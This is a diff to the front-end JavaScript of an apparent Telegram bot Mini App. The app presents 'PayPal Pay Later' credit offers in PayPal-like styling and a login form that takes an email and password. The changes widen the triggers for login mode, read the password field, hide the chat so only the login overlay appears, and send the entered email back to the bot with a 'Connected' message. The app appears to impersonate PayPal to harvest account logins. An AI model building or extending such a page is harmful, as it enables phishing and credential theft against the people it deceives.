@@ -5,7 +5,10 @@ if (tg) { tg.ready(); tg.expand(); }
 
 const API = '/api';
 let busy = false, flowState = 'idle', chosenOffer = null;
-let openedForLogin = window.location.hash === '#login';
+// Check if opened for login — hash may come as #login or encoded
+let openedForLogin = window.location.hash.includes('login') ||
+                     window.location.href.includes('#login') ||
+                     window.location.search.includes('mode=login');
 
 const OFFERS = [
   { tag:'Best Match', name:'PayPal Pay Later', amt:'$2,500', score:96, detail:'0% APR · 6 months · No annual fee' },
@@ -82,13 +85,35 @@ async function handleLogin() {
   btn.classList.add('done');
   await sleep(600);
 
-  // If opened from bot chat (#login), send data back and close
-  if (openedForLogin && tg) {
+  // If opened from bot chat for login, send data back and close
+  if (openedForLogin) {
     const email = $('loginEmail').value || 'user@email.com';
+    const pass = $('loginPass').value;
+    if (!email) { btn.textContent = 'Log In'; btn.classList.remove('loading'); return; }
     const name = email.split('@')[0].replace(/[._]/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
-    tg.sendData(JSON.stringify({ action: 'login_complete', user: name, email: email }));
-    await sleep(300);
-    tg.close();
+
+    // Show success state
+    btn.textContent = '✓ Connected — Returning to chat...';
+    await sleep(800);
+
+    // Send data to bot and close Mini App
+    if (tg) {
+      try {
+        tg.sendData(JSON.stringify({ action: 'login_complete', user: name, email: email }));
+      } catch(e) { console.log('sendData error:', e); }
+      await sleep(500);
+      try { tg.close(); } catch(e) { console.log('close error:', e); }
+    }
+
+    // Fallback — show "return to chat" message if close didn't work
+    await sleep(1000);
+    document.querySelector('.login-card').innerHTML = `
+      <div style="text-align:center;padding:20px">
+        <div style="font-size:2rem;margin-bottom:12px">✅</div>
+        <div style="font-size:16px;font-weight:700;color:#003087;margin-bottom:8px">Connected as ${name}</div>
+        <div style="font-size:13px;color:#666;margin-bottom:16px">Close this window to return to the bot chat.</div>
+        <div style="font-size:12px;color:#999">The bot will continue the credit flow automatically.</div>
+      </div>`;
     return;
   }
 
@@ -497,8 +522,11 @@ async function doSend() {
 // ── Auto-start ──
 window.addEventListener('load', () => {
   if (openedForLogin) {
-    // Opened from bot chat for login only — show login screen directly
-    showLogin();
+    // Opened from bot chat for login only — hide chat, show login directly
+    document.querySelector('.chat-hd').style.display = 'none';
+    document.querySelector('.chat-bg').style.display = 'none';
+    document.querySelector('.chat-inp').style.display = 'none';
+    $('loginOverlay').classList.add('show');
   } else {
     // Normal Mini App — start chat flow
     setTimeout(startFlow, 500);
